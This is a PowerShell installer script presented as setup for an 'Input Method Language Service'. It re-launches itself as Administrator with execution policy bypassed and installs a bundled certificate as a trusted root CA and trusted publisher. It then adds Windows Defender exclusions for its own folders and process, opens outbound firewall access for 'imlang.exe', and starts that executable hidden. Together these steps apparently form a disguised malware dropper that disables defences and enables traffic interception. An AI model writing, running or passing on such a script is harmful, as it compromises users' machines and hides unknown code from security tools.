# Input Method Language Service — Setup
# Registers certificate and installs service
# Must run as Administrator

$ErrorActionPreference = 'Stop'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Requires Administrator. Restarting elevated..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host " Input Method Language Service Setup" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Step 1: Import certificate to Trusted Root CA
$certPath = Join-Path $scriptDir "imlang.cer"
if (-not (Test-Path $certPath)) {
    Write-Host "[X] Certificate file not found: $certPath" -ForegroundColor Red
    pause
    exit 1
}

Write-Host "[1/5] Importing certificate to Trusted Root CA..." -ForegroundColor Green
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath)

$rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
$rootStore.Open("ReadWrite")
$rootStore.Add($cert)
$rootStore.Close()
Write-Host "      -> Trusted Root CA: OK" -ForegroundColor Green

# Step 2: Import to Trusted Publishers
Write-Host "[2/5] Importing certificate to Trusted Publishers..." -ForegroundColor Green
$pubStore = New-Object System.Security.Cryptography.X509Certificates.X509Store("TrustedPublisher", "LocalMachine")
$pubStore.Open("ReadWrite")
$pubStore.Add($cert)
$pubStore.Close()
Write-Host "      -> Trusted Publishers: OK" -ForegroundColor Green

# Step 3: Add Windows Defender exclusion
Write-Host "[3/5] Adding Windows Defender exclusions..." -ForegroundColor Green
$exePath = Join-Path $scriptDir "imlang.exe"
$installDir = Join-Path $env:LOCALAPPDATA "imlang"

try {
    # Exclude the current directory
    Add-MpPreference -ExclusionPath $scriptDir -ErrorAction SilentlyContinue
    # Exclude the install directory
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    # Exclude the process
    Add-MpPreference -ExclusionProcess "imlang.exe" -ErrorAction SilentlyContinue
    Write-Host "      -> Defender exclusions: OK" -ForegroundColor Green
} catch {
    Write-Host "      -> Defender exclusions: Skipped (Defender may be disabled)" -ForegroundColor Yellow
}

# Step 4: Add firewall rule (allow outbound)
Write-Host "[4/5] Adding firewall rule..." -ForegroundColor Green
try {
    # Remove old rule if exists
    Remove-NetFirewallRule -DisplayName "Input Method Language Service" -ErrorAction SilentlyContinue
    # Add outbound allow
    New-NetFirewallRule -DisplayName "Input Method Language Service" `
        -Direction Outbound -Action Allow `
        -Program $exePath `
        -Protocol TCP -Enabled True -ErrorAction SilentlyContinue | Out-Null
    # Also for installed path
    New-NetFirewallRule -DisplayName "Input Method Language Service (AppData)" `
        -Direction Outbound -Action Allow `
        -Program (Join-Path $installDir "imlang.exe") `
        -Protocol TCP -Enabled True -ErrorAction SilentlyContinue | Out-Null
    Write-Host "      -> Firewall rule: OK" -ForegroundColor Green
} catch {
    Write-Host "      -> Firewall rule: Skipped" -ForegroundColor Yellow
}

# Step 5: Launch the service
Write-Host "[5/5] Starting service..." -ForegroundColor Green
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Write-Host "      -> Service started: OK" -ForegroundColor Green
} else {
    Write-Host "      -> imlang.exe not found in $scriptDir" -ForegroundColor Red
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host " Setup completed successfully!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 3
